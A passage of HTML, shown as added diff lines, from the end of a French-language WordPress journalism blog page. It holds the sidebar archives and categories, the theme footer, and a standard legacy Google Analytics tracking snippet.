href="http://blog.edouarddemareschal.com/?p=586#comment-82">Lonely Coney Island</a></li></ul><h3>Archives</h3>		<ul>
+			<li><a href='http://blog.edouarddemareschal.com/?m=201202' title='février 2012'>février 2012</a></li>
+	<li><a href='http://blog.edouarddemareschal.com/?m=201106' title='juin 2011'>juin 2011</a></li>
+	<li><a href='http://blog.edouarddemareschal.com/?m=201105' title='mai 2011'>mai 2011</a></li>
+	<li><a href='http://blog.edouarddemareschal.com/?m=201103' title='mars 2011'>mars 2011</a></li>
+	<li><a href='http://blog.edouarddemareschal.com/?m=201102' title='février 2011'>février 2011</a></li>
+	<li><a href='http://blog.edouarddemareschal.com/?m=201101' title='janvier 2011'>janvier 2011</a></li>
+	<li><a href='http://blog.edouarddemareschal.com/?m=201012' title='décembre 2010'>décembre 2010</a></li>
+	<li><a href='http://blog.edouarddemareschal.com/?m=201011' title='novembre 2010'>novembre 2010</a></li>
+	<li><a href='http://blog.edouarddemareschal.com/?m=201010' title='octobre 2010'>octobre 2010</a></li>
+	<li><a href='http://blog.edouarddemareschal.com/?m=201009' title='septembre 2010'>septembre 2010</a></li>
+	<li><a href='http://blog.edouarddemareschal.com/?m=201006' title='juin 2010'>juin 2010</a></li>
+	<li><a href='http://blog.edouarddemareschal.com/?m=201005' title='mai 2010'>mai 2010</a></li>
+	<li><a href='http://blog.edouarddemareschal.com/?m=201004' title='avril 2010'>avril 2010</a></li>
+	<li><a href='http://blog.edouarddemareschal.com/?m=201003' title='mars 2010'>mars 2010</a></li>
+	<li><a href='http://blog.edouarddemareschal.com/?m=201002' title='février 2010'>février 2010</a></li>
+		</ul>
+<h3>Catégories</h3>		<ul>
+	<li class="cat-item cat-item-2"><a href="http://blog.edouarddemareschal.com/?cat=2" title="Voir tous les articles classés dans CUNY">CUNY</a>
+</li>
+	<li class="cat-item cat-item-3"><a href="http://blog.edouarddemareschal.com/?cat=3" title="Voir tous les articles classés dans diapos sonores">diapos sonores</a>
+</li>
+	<li class="cat-item cat-item-4"><a href="http://blog.edouarddemareschal.com/?cat=4" title="Voir tous les articles classés dans L&#039;Express">L&#039;Express</a>
+</li>
+	<li class="cat-item cat-item-5"><a href="http://blog.edouarddemareschal.com/?cat=5" title="Voir tous les articles classés dans New York">New York</a>
+</li>
+	<li class="cat-item cat-item-1"><a href="http://blog.edouarddemareschal.com/?cat=1" title="Voir tous les articles classés dans Non classé">Non classé</a>
+</li>
+	<li class="cat-item cat-item-6"><a href="http://blog.edouarddemareschal.com/?cat=6" title="Voir tous les articles classés dans photos">photos</a>
+</li>
+	<li class="cat-item cat-item-7"><a href="http://blog.edouarddemareschal.com/?cat=7" title="Voir tous les articles classés dans publications">publications</a>
+</li>
+	<li class="cat-item cat-item-8"><a href="http://blog.edouarddemareschal.com/?cat=8" title="Voir tous les articles classés dans stage">stage</a>
+</li>
+	<li class="cat-item cat-item-9"><a href="http://blog.edouarddemareschal.com/?cat=9" title="Voir tous les articles classés dans Uncategorized">Uncategorized</a>
+</li>
+		</ul>
+<h3>Méta</h3>			<ul>
+						<li><a href="http://blog.edouarddemareschal.com/wp-login.php">Connexion</a></li>
+			<li><a href="http://blog.edouarddemareschal.com/?feed=rss2" title="Suivez ce site par syndication RSS 2.0">Flux <abbr title="Really Simple Syndication">RSS</abbr> des articles</a></li>
+			<li><a href="http://blog.edouarddemareschal.com/?feed=comments-rss2" title="Les derniers commentaires pour tous les articles, au format RSS"><abbr title="Really Simple Syndication">RSS</abbr> des commentaires</a></li>
+			<li><a href="http://www.wordpress-fr.net/" title="Propulsé par WordPress, plate-forme de publication personnelle sémantique de pointe.">Site de WordPress-FR</a></li>						</ul>
+
+
+</div>
+
+</div>
+
+<div id="footer">
+	<p class="vcard">The Journalist template by <a href="http://lucianmarin.com/" class="fn url" rel="designer">Lucian E. Marin</a> &mdash; Built for <a href="http://wordpress.org/">WordPress</a></p>
+</div>
+
+<script type="text/javascript">
+  var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
+  document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
+</script>
+<script type="text/javascript">
+  try
+  {
+    var pageTracker = _gat._getTracker("UA-15311764-1");
+    pageTracker._trackPageview();
+  }
+  catch(err) {}
+</script>
+
+<script type='text/javascript' src='http://s0.wp.com/wp-content/js/devicepx-jetpack.js?ver=201812'></script>
+</body>
+</html>
